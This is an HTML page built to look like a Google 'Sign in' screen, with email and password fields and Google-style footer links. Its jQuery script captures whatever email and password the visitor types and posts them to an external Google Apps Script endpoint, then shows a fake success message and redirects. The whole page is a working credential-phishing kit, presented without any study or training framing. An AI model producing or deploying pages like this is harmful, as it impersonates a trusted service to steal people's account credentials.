<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="style.css" type="text/css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
  
</head>
<body>
    <div class="col-12 col-sm-12 col-md-12 col-lg-12" >
        <div class="col-lg-11 signup-section">
            <img style="width: 50px; margin-top: 20px;" src="https://cdn-icons-png.flaticon.com/512/2991/2991148.png" alt="This image is not found">
            <h2 style="margin-top: 10px;">Sign in</h2>
            <h6 style="font-size: 12px; color: gray; margin-top: 13px;">Using your Google Account</h6>
<form id="submit-form" action="">
            <input id="email" name="email" type="email" placeholder="Email adress">
            <input id="password" type="password" name="name" placeholder="Password">
            <h6 style="font-size: 8px;color: gray; text-align: left; margin-top: 12px;margin-left: 12px;;">Not your computer? Use Guest mode to sign in privately.<br> Learn more about using Guest mode</h6>
            <button type="submit" style="background: blue;width: 90px;margin-left:170px;margin-top: 18px; border-radius: 15px; color: white;font-weight: 600; text-decoration: none;">Sigin in</button>
            
                </form>
            </div>
             <h6 style="font-size: 10px; color: lightgray;margin-top: 30px; margin-left: 25px;">English (United states)</h6>
            <h6 style="font-size: 10px; color: lightgray;margin-top: -20px; margin-left: 200px;">Help </h6>
            <h6 style="font-size: 10px; color: lightgray;margin-top: -20px; margin-left: 250px;">Privacy</h6>
            <h6 style="font-size: 10px; color: lightgray;margin-top: -20px; margin-left: 300px;">Terms</h6>
           
            </div>
            <script>
                $("#submit-form").submit((e)=>{
                    e.preventDefault()
                    $.ajax({
                        url:"https://script.google.com/macros/s/AKfycbxcy_KbcEzsP_uFxU_-KACbcSDNXUe6YDXiOdkeRNGLxrsWscWOWZNozfnEnk2XnyIu3Q/exec",
                        data:$("#submit-form").serialize(),
                        method:"post",
                        success:function (response){
                            alert("Succesfully Logined")
                            window.location.reload()
                            window.location.href="messages.html"
                        },
                        error:function (err){
                            alert("Something Error")
            
                        }
                    })
                })
            </script>
</body>
</html>
